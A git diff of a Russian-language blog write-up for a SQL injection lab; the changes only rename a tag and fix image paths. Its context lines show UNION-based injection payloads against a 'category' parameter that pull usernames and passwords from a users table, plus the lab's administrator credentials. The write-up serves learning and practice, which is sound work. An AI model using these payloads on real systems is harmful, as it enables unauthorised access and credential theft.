@@ -1,7 +1,7 @@
 ---
 title: "SQL injection UNION attack retrieving data from other tables"
 date: 2025-06-19
-tags: [sql, writeup]
+tags: [sqli, writeup]
 ---
 
 **Source:** [Coffee Cube](https://t.me/coffee_cube)  
@@ -37,7 +37,7 @@ SELECT * FROM table WHERE category = 'Pets'
 Pets' and 0=1-- -
 ```
 
-![IMG](/assets/images/IMG_union_sqli/IMG_SQLinjection-UNION-attack-retrieving-data-from-other-tables/1.png){: height="200" .align-center}
+![IMG](/assets/images/IMG_union_sqli/IMG_SQL-injection-UNION-attack-retrieving-data-from-other-tables/1.png){: height="200" .align-center}
 
 Страница пустая, значит для обрамления используются одинарные кавычки. Теперь узнаю количество полей в запросе с помощью `ORDER BY`:
 
@@ -62,10 +62,10 @@ Pets' and false UNION SELECT '1', '2'-- -Ok
 Pets' and false UNION SELECT username, password FROM users WHERE username = 'administrator'-- -ok
 ```
 
-![IMG](/assets/images/IMG_union_sqli/IMG_SQLinjection-UNION-attack-retrieving-data-from-other-tables/2.png){: height="200" .align-center}
+![IMG](/assets/images/IMG_union_sqli/IMG_SQL-injection-UNION-attack-retrieving-data-from-other-tables/2.png){: height="200" .align-center}
 
 Получил креды: `administrator`:`5j1o1b7ls5ltyvanoo42`. Зайду в аккаунт: 
 
-![IMG](/assets/images/IMG_union_sqli/IMG_SQLinjection-UNION-attack-retrieving-data-from-other-tables/3.png){: height="200" .align-center}
+![IMG](/assets/images/IMG_union_sqli/IMG_SQL-injection-UNION-attack-retrieving-data-from-other-tables/3.png){: height="200" .align-center}
 
 Ну, все. Я получил власть...
